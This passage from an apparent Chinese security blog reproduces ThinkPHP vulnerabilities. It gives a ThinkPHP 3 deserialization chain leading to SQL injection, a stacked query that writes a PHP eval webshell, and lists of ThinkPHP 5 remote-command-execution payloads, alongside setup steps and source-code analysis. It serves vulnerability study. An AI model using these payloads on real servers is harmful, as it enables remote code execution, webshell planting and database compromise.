            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Model</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Think</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
    <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Think<span class="token punctuation">\</span>Image<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240306003526531.png" alt="image-20240306003526531"></p>
<p>成了</p>
<p>接下来继续分析</p>
<p>由于<code>$this-&gt;data</code>可控，再次调用 delete 方法相当于 options 参数可控</p>
<p>继续往下看这个方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240306004521538.png" alt="image-20240306004521538"></p>
<p>到了<code>$this-&gt;db</code>这里，其中的delete方法参数是 options 可控</p>
<p>接下来就可以继续全局搜delete方法，此时参数可控</p>
<p>那么我们就可以调用自带的数据库类 Mysql.class.php 中的 delete() 方法，而这些类都是继承 Driver.class.php下的Driver类</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240306004930362.png" alt="image-20240306004930362"></p>
<p>结合全局搜索的结果我们跟进到 ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Db&#x2F;Driver.class.php 看看</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240306005054622.png" alt="image-20240306005054622"></p>
<p>此处的sql语句或许存在注入，直接与$table进行拼接了</p>
<p>看一下上面的<code>parseTable</code>方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$tables</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$tables</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">// 支持别名定义</span>
            <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$tables</span> <span class="token keyword">as</span> <span class="token variable">$table</span> <span class="token operator">=></span> <span class="token variable">$alias</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$alias</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$alias</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>

            <span class="token punctuation">&#125;</span>
            <span class="token variable">$tables</span> <span class="token operator">=</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$tables</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$tables</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$tables</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$tables</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'parseKey'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$tables</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里只调用了<code>parseKey</code>方法，继续跟进看看</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 字段名分析
 * @access protected
 * @param string $key
 * @return string
 */</span>
<span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">parseKey</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$key</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>没有过滤，直接将传入的参数返回</p>
<p>而下方就直接执行sql语句了，我们可以打印一手看看方便调试</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240306005604946.png" alt="image-20240306005604946"></p>
<p>所以我们可以在<code>&#39;Delete From&#39; . $table</code>这里注入</p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><p>接下来就是构造链子：<code>Imagick -&gt; Memcache -&gt; Model -&gt; Mysql</code></p>
<p>这里要注意到 where 键需要设置为<code>1=1</code>才能执行 delete，table 键会被传入<code>_parseOptions</code>方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">      <span class="token comment">// 分析表达式</span>
      <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">_parseOptions</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span>
          <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而<code>$pk</code>要用来获取主键名称，所以要记得带上</p>
<p>最终payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Image<span class="token punctuation">\</span>Driver</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Session<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Imagick</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$img</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">img</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Session<span class="token punctuation">\</span>Driver</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcache</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Model</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Think</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Db<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Mysql</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$pk</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysql</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pk</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pk</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
                <span class="token string double-quoted-string">"table"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"mysql.user where 0 or updatexml(1,concat(0x7e,database()),1)#"</span><span class="token punctuation">,</span>
                <span class="token string double-quoted-string">"where"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"1=1"</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Db<span class="token punctuation">\</span>Driver</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Mysql</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
            <span class="token string double-quoted-string">"debug"</span>    <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">,</span>
            <span class="token string double-quoted-string">"database"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"tp3"</span><span class="token punctuation">,</span>
            <span class="token string double-quoted-string">"hostname"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span>
            <span class="token string double-quoted-string">"hostport"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"3306"</span><span class="token punctuation">,</span>
            <span class="token string double-quoted-string">"charset"</span>  <span class="token operator">=></span> <span class="token string double-quoted-string">"utf8"</span><span class="token punctuation">,</span>
            <span class="token string double-quoted-string">"username"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span>
            <span class="token string double-quoted-string">"password"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"root"</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Think<span class="token punctuation">\</span>Image<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>数据库的信息这里需要自行修改</p>
<p>不过报错注入权限比较低，我们要想拿shell的话需要写入木马。所以可以开启堆叠后写入一句话木马</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">"&lt;?php eval($_POST[1]);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/var/www/html/a.php"</span><span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>前面说到可以控制服务器去连接任意数据库，所以就可以构造恶意mysql数据库让服务器去连接从而 load data</p>
<p>脚本地址：<a target="_blank" rel="noopener" href="https://github.com/MorouU/rogue_mysql_server/blob/main/rogue_mysql_server.py">https://github.com/MorouU/rogue_mysql_server/blob/main/rogue_mysql_server.py</a></p>
<p>修改脚本中要读的文件和端口（不要用3306），同时修改php脚本中的数据库配置</p>
<hr>
<h1 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a>ThinkPHP5</h1><p>tp5最出名的就是rce了，payload大多数要利用兼容模式<code>?s=</code>来访问路由</p>
<p>官方文档：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5/">https://www.kancloud.cn/manual/thinkphp5/</a></p>
<h2 id="RCE-payload总结"><a href="#RCE-payload总结" class="headerlink" title="RCE payload总结"></a>RCE payload总结</h2><p>主要的payload分为两种：一种是因为Request类的<code>method</code>和<code>__construct</code>方法造成的，另一种是因为Request类在兼容模式下获取的控制器没有进行合法校验（即未开启强制路由导致rce）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//php.local/thinkphp5.0.5/public/index.php?s=index</span>
post
_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>call_user_func<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>phpinfo
_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>whoami

<span class="token comment"># ThinkPHP &lt;= 5.0.13</span>
<span class="token constant">POST</span> <span class="token operator">/</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>index
s<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system

<span class="token comment"># ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug</span>
<span class="token constant">POST</span> <span class="token operator">/</span>
_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>server<span class="token punctuation">[</span><span class="token constant">REQUEST_METHOD</span><span class="token punctuation">]</span><span class="token operator">=</span>ls <span class="token operator">-</span>al

<span class="token comment"># ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha</span>
<span class="token constant">POST</span> <span class="token operator">/</span><span class="token operator">?</span>s<span class="token operator">=</span>xxx <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>ls<span class="token operator">+</span><span class="token operator">-</span>al
_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>server<span class="token punctuation">[</span><span class="token constant">REQUEST_METHOD</span><span class="token punctuation">]</span><span class="token operator">=</span>ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>5.0.x ：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\config<span class="token operator">/</span>get<span class="token operator">&amp;</span>name<span class="token operator">=</span>database<span class="token operator">.</span>username <span class="token comment">// 获取配置信息</span>
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Lang<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>test<span class="token operator">.</span>jpg    <span class="token comment">// 包含任意文件</span>
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Config<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>t<span class="token operator">.</span>php     <span class="token comment">// 包含任意.php文件</span>
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>id
<span class="token operator">?</span>s<span class="token operator">=</span><span class="token class-name">index</span><span class="token operator">|</span><span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>app</span><span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>5.1.x ：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
?s=index/\think\view\driver\Php/display&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>PHP &gt;&#x3D; 5.4.0</p>
<p>composer直接安装5.0.5</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">composer</span> create-project topthink/think<span class="token operator">=</span><span class="token number">5.0</span>.5 tp5 --prefer-dist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后修改tp目录下的composer.json</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">">=5.4.0"</span><span class="token punctuation">,</span>
    <span class="token property">"topthink/framework"</span><span class="token operator">:</span> <span class="token string">"5.0.5"</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行一下<code>composer update</code>即可</p>
<p>注：网页的根目录设置在public目录下</p>
<h2 id="method任意调用方法导致rce"><a href="#method任意调用方法导致rce" class="headerlink" title="method任意调用方法导致rce"></a>method任意调用方法导致rce</h2><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><p>每个小版本都有对应的payload：<a target="_blank" rel="noopener" href="https://y4er.com/posts/thinkphp5-rce/#method-__contruct%E5%AF%BC%E8%87%B4%E7%9A%84rce-%E5%90%84%E7%89%88%E6%9C%ACpayload">https://y4er.com/posts/thinkphp5-rce/#method-__contruct%E5%AF%BC%E8%87%B4%E7%9A%84rce-%E5%90%84%E7%89%88%E6%9C%ACpayload</a></p>
<p>这里还是以5.0.5版本的payload为例</p>
<p>debug 无关 命令执行</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>index
s<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">POST</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system
aaaa<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system
_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>写shell</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">POST
s=file_put_contents('test.php','&lt;?php phpinfo();')&amp;_method=__construct&amp;method=POST&amp;filter[]=assert<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>漏洞点在 thinkphp&#x2F;library&#x2F;think&#x2F;Request.php:504 <code>Request</code>类的<code>method</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310113025208.png" alt="image-20240310113025208"></p>
<p>这里可以通过POST数组传入<code>__method</code>来改变<code>$this-&gt;&#123;$this-&gt;method&#125;($_POST);</code>达到任意调用此类中的方法</p>
<p>接下来我们看看这个类中的<code>__construct</code>方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 架构函数
 * @access protected
 * @param array $options 参数
 */</span>
<span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token keyword">as</span> <span class="token variable">$name</span> <span class="token operator">=></span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">property_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token class-name static-context">Config</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'default_filter'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 保存 php://input</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">input</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
